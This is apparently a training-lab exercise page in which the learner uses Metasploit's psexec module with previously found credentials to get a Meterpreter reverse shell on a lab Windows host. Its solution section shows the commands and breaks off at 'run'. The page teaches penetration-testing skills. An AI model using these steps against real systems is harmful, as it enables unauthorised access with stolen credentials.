# **Challenge 6: Metasploit**
!!! note ""
## **Procedure:**

Now that we have a username and password, we need to use them to gain access to one of the Windows targets. Connecting using "legitimate" means like Remote Desktop Protocol (RDP) could be possible, but a Meterpreter shell can give us more user-friendly options to achieve our goals. 

- Start up the Metasploit framework on Kali, and load the windows/smb/psexec exploit module. 
Note: This module is a common exploit for gaining access to Windows machines with stolen credentials. 
- Configure the module's options to set the username and password you found previously. You will not need to specify a domain. 
Set the `RHOSTS` target to one of the Windows IPs you found with Nmap earlier. 
Note: These credentials will only work on one of the two Windows machines. If the exploit fails, set the other IP address as the target and try again.
- Set the payload to `windows/x64/meterpreter/reverse_tcp` and confirm its options automatically configure properly.
- Run the exploit. If everything works, you will be dropped into a Meterpreter shell on the target system. If not, test it against the other Windows target. If neither exploit works, double-check your options (check for typos in IP addresses, usernames, passwords, etc.) 


## **Solution:**

### Start up the Metasploit framework on Kali, and load the `windows/smb/psexec` exploit module.

### Set the RHOSTS and running the `psexec` module (Windows VM 172.31.43.103)

```bash linenums="1" hl_lines="2 15"
msf6 exploit(windows/smb/psexec) > set RHOST 172.31.43.103
RHOST => 172.31.43.103
msf6 exploit(windows/smb/psexec) > run
